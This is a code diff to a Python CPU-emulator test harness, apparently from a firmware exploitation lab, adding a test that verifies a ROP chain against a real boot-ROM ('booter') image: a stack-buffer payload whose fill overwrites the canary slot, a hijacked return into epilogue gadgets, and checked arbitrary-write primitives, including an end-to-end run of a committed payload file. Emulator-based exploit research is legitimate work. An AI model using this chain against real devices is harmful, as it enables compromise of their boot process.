@@ -331,7 +331,21 @@ class Emu:
     md.detail = False
 
     def run(self, budget=200000):
-        while self.fail is None and self.steps < budget and self.pc not in self.stop_at:
+        # rearm_stop: when set, the run passes THROUGH the stop set once
+        # (the pc already inside it) and stops at the NEXT arrival — the
+        # "stop at the re-entry" semantic (the 4.45 W3 spin demonstration).
+        # stop_pred: a predicate evaluated BEFORE each step — the stop =
+        # the semantic condition (e.g. the counter bumped = the invocation
+        # complete), needed because the re-entry pc = the loop-body pc.
+        rearm = getattr(self, "rearm_stop", False)
+        pred = getattr(self, "stop_pred", None)
+        left = not rearm
+        while self.fail is None and self.steps < budget and (
+                self.pc not in self.stop_at or (rearm and not left)):
+            if pred is not None and pred(self):
+                break
+            if rearm and self.pc not in self.stop_at:
+                left = True
             self.step()
         return self
 
@@ -511,6 +525,188 @@ def test_444():
 
     n_pass = sum(1 for _, ok, _ in results if ok)
     print(f"test-444: {n_pass}/{len(results)} PASS")
+    return 0 if n_pass == len(results) else 1
+
+
+def test_rop():
+    """4.45 TÂCHE C2 — the ROP chain on the REAL booter image.
+
+    The model (the explicit walls — the findings-4.45 §B):
+      W1: a1/a4 at the gadget entry = the ROM's residue (0 work-gadgets,
+          v444e re-run) — the test MODELS the assumed block (the day-J
+          discovery = the runbook R0);
+      W2: the body always writes [a1] first = the wild write — modeled
+          to the scratch;
+      W3: the primitive's ret returns INTO the primitive = the spin —
+          the test DEMONSTRATES it (the stop = the re-entry).
+    The modeled hijack: the ROM's DMA laid the payload ONTO its stack
+    buffer (the payload AT the modeled stack); the return = hijacked to
+    the hijack slot; sp = the slot after (the bare-ret model).
+
+    TR-A the uniformity fill: the fill covers the canary slot (the
+         mechanical defeat; the zero-canary = the A2 hypothesis)
+    TR-B the spine walk: the REAL epilogue bytes G40 x3, the exact
+         0x40 steps, the terminal reached, the walk cell = [sp+8]
+    TR-C the primitive (a3=1): [a1] = valeur #1; the counter [dest]+=1;
+         the slot = slot0+1; the stop = the re-entry (W3)
+    TR-D the scatter (a3=3): the wild #1 + the scatter #2/#3 = the
+         valeurs at [dest+slot0*8+k*8]; the counter += 3
+    TR-E E2E: the COMMITTED payload (v445_rop_payload.bin) drives the
+         whole chain on the real image; the writes land.
+    PASS = the writes observed at the modeled targets.
+    """
+    import importlib.util
+    lab = Path(__file__).resolve().parent.parent / "lab/jalon411"
+    spec = importlib.util.spec_from_file_location(
+        "v445_build", lab / "v445_rop_payload_build.py")
+    B = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(B)
+
+    img = load_image()
+    results = []
+
+    def check(name, cond, detail=""):
+        results.append((name, bool(cond), detail))
+        print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")
+
+    PAY = 0x16A000          # the modeled ROM stack buffer (the DMA dst)
+    SCRATCH = 0x168000      # the modeled a1 residue (the wild-write dst)
+    DEST = 0x161000         # the scatter/counter base (the ctx clone's dest)
+    FILL_LEN, HOPS, SLOT0 = 64, 3, 1
+    VALEURS = (0x112, 0x113, 0x114)
+    SP0 = PAY + (FILL_LEN + 1) * 8   # the sp after the modeled hijack
+    TERMINAL = B.TERMINAL
+    G40 = B.G40
+
+    def lay(payload):
+        e = Emu(img)
+        for i, b in enumerate(payload):
+            e.mem[PAY - 0x100000 + i] = b
+        return e
+
+    def hijack(e):
+        # the modeled hijack: pc = the hijack slot (the popped ra),
+        # sp = the slot after (the bare-ret epilogue model)
+        e.regs[2] = SP0
+        e.pc = int.from_bytes(
+            e.mem[PAY - 0x100000 + FILL_LEN * 8:
+                  PAY - 0x100000 + FILL_LEN * 8 + 8], "little")
+
+    # ---- TR-A: the uniformity fill swallows the canary slot ----
+    payload, meta = B.build(fill_len=FILL_LEN, hops=HOPS, slot0=SLOT0,
+                            dest=DEST, base_addr=PAY, valeurs=VALEURS)
+    words = [int.from_bytes(payload[i * 8:(i + 1) * 8], "little")
+             for i in range(len(payload) // 8)]
+    canary_slot = 32  # the modeled canary position (INDECIDABLE-BY-BYTES)
+    check("TR-A the fill = uniform on [0, fill_len)",
+          all(w == 0 for w in words[:FILL_LEN]),
+          f"{FILL_LEN} u64 = {hex(words[0])}")
+    check("TR-A the canary slot swallowed by the uniformity",
+          words[canary_slot] == 0,
+          f"slot {canary_slot} = {hex(words[canary_slot])} (the fill — the "
+          f"A2 zero-canary hypothesis)")
+    check("TR-A the size = the memdesc 0x1000", len(payload) == 0x1000)
+
+    # ---- TR-B: the spine walk (the REAL epilogue bytes) ----
+    e = lay(payload)
+    hijack(e)
+    e.stop_at = {TERMINAL}
+    e.run(budget=200)
+    sp_after = SP0 + 0x40 * HOPS
+    check("TR-B the spine = the REAL bytes G40 x3 -> the terminal",
+          e.pc == TERMINAL and not e.fail,
+          f"pc={e.pc:#x} steps={e.steps}")
+    check("TR-B the exact 0x40 steps",
+          e.regs[2] == sp_after,
+          f"sp={e.regs[2]:#x} attendu={sp_after:#x}")
+    check("TR-B the walk cell = [sp+8] = &list[0]",
+          e.rmem(e.regs[2] + 8, 8) == PAY + 0x500,
+          f"[sp+8]={e.rmem(e.regs[2]+8,8):#x}")
+
+    # ---- TR-C: the primitive (a3=1) GIVEN the assumed block ----
+    e = lay(payload)
+    hijack(e)
+    e.stop_at = {TERMINAL}
+    e.run(budget=200)
+    # the assumed register block (the A3 assumption — the day-J = R0)
+    e.regs[REG_NAMES.index("a0")] = M - 1
+    e.regs[REG_NAMES.index("a3")] = 1
+    e.regs[REG_NAMES.index("a7")] = 0
+    e.regs[REG_NAMES.index("a1")] = SCRATCH   # the WILD write dst (W2)
+    e.regs[REG_NAMES.index("a4")] = PAY       # the ctx = the payload base
+    e.stop_at = {TERMINAL}                    # W3: the re-entry = the stop
+    e.rearm_stop = True                       # pass through once, stop at
+    e.run(budget=200)                         # the re-entry
+    check("TR-C [a1] = la valeur #1 (the wild write = the modeled scratch)",
+          e.rmem(SCRATCH, 8) == VALEURS[0],
+          f"[scratch]={e.rmem(SCRATCH,8):#x} attendu={VALEURS[0]:#x}")
+    check("TR-C the counter [dest] += 1",
+          e.rmem(DEST, 8) == 1, f"[dest]={e.rmem(DEST,8)}")
+    check("TR-C the slot ctx = slot0+1",
+          e.rmem(PAY + 0x488, 8) == SLOT0 + 1,
+          f"slot={e.rmem(PAY+0x488,8)}")
+    check("TR-C W3 the stop = the re-entry (the spin demonstrated)",
+          e.pc == TERMINAL and not e.fail,
+          f"pc={e.pc:#x} (the primitive returned INTO itself)")
+
+    # ---- TR-D: the scatter (a3=3): the wild #1 + the scatter #2/#3 ----
+    e = lay(payload)
+    hijack(e)
+    e.stop_at = {TERMINAL}
+    e.run(budget=200)
+    e.regs[REG_NAMES.index("a0")] = M - 1
+    e.regs[REG_NAMES.index("a3")] = 3
+    e.regs[REG_NAMES.index("a7")] = 0
+    e.regs[REG_NAMES.index("a1")] = SCRATCH
+    e.regs[REG_NAMES.index("a4")] = PAY
+    e.stop_at = set()
+    # the stop = the semantic condition: the invocation complete (the
+    # counter bumped) — the re-entry pc = the loop-body pc (the same
+    # address) — the pc alone cannot distinguish them
+    e.stop_pred = lambda emu: emu.rmem(DEST, 8) == 3
+    e.run(budget=400)
+    check("TR-D the wild #1 = la valeur #1",
+          e.rmem(SCRATCH, 8) == VALEURS[0],
+          f"[scratch]={e.rmem(SCRATCH,8):#x}")
+    check("TR-D the scatter #2 = [dest+(slot0+1)*8] (the ring slot advances)",
+          e.rmem(DEST + (SLOT0 + 1) * 8, 8) == VALEURS[1],
+          f"[dest+16]={e.rmem(DEST+16,8):#x} attendu={VALEURS[1]:#x}")
+    check("TR-D the scatter #3 = [dest+(slot0+2)*8]",
+          e.rmem(DEST + (SLOT0 + 2) * 8, 8) == VALEURS[2],
+          f"[dest+24]={e.rmem(DEST+24,8):#x} attendu={VALEURS[2]:#x}")
+    check("TR-D the counter [dest] += 3",
+          e.rmem(DEST, 8) == 3, f"[dest]={e.rmem(DEST,8)}")
+
+    # ---- TR-E: E2E — the COMMITTED payload drives the chain ----
+    # the committed payload = the single-valeur list (0x112) -> a3 = 1
+    repo = (Path(__file__).resolve().parent.parent /
+            "lab/jalon411/v445_rop_payload.bin").read_bytes()
+    e = lay(repo)
+    hijack(e)
+    e.stop_at = {TERMINAL}
+    e.run(budget=200)
+    spine_ok = e.pc == TERMINAL and e.regs[2] == sp_after
+    e.regs[REG_NAMES.index("a0")] = M - 1
+    e.regs[REG_NAMES.index("a3")] = 1
+    e.regs[REG_NAMES.index("a7")] = 0
+    e.regs[REG_NAMES.index("a1")] = SCRATCH
+    e.regs[REG_NAMES.index("a4")] = PAY
+    e.stop_at = set()
+    e.stop_pred = lambda emu: emu.rmem(DEST, 8) == 1
+    e.run(budget=300)
+    check("TR-E E2E the committed payload: the spine -> the terminal",
+          spine_ok, f"pc={e.pc:#x} sp={e.regs[2]:#x}")
+    check("TR-E E2E the write lands (0x112 the wild -> the modeled scratch)",
+          e.rmem(SCRATCH, 8) == 0x112,
+          f"[scratch]={e.rmem(SCRATCH,8):#x}")
+    check("TR-E E2E the walk cell advanced (&list[1])",
+          e.rmem(sp_after + 8, 8) == PAY + 0x508,
+          f"[sp+8]={e.rmem(sp_after+8,8):#x}")
+    check("TR-E E2E the counter [dest] += 1",
+          e.rmem(DEST, 8) == 1, f"[dest]={e.rmem(DEST,8)}")
+
+    n_pass = sum(1 for _, ok, _ in results if ok)
+    print(f"test-rop: {n_pass}/{len(results)} PASS")
     return 0 if n_pass == len(results) else 1
 
 
@@ -743,8 +939,12 @@ def main():
                     help="4.42: la validation de la transfer-list (TT-A..D)")
     ap.add_argument("--test-444", action="store_true",
                     help="4.44: la chaîne v444 sur l'image réelle (TF-A..C)")
+    ap.add_argument("--test-rop", action="store_true",
+                    help="4.45: la chaîne ROP débordante sur l'image réelle (TR-A..E)")
     ap.add_argument("--selftest", action="store_true")
     a = ap.parse_args()
+    if a.test_rop:
+        return test_rop()
     if a.test_444:
         return test_444()
     if a.test_transfer:
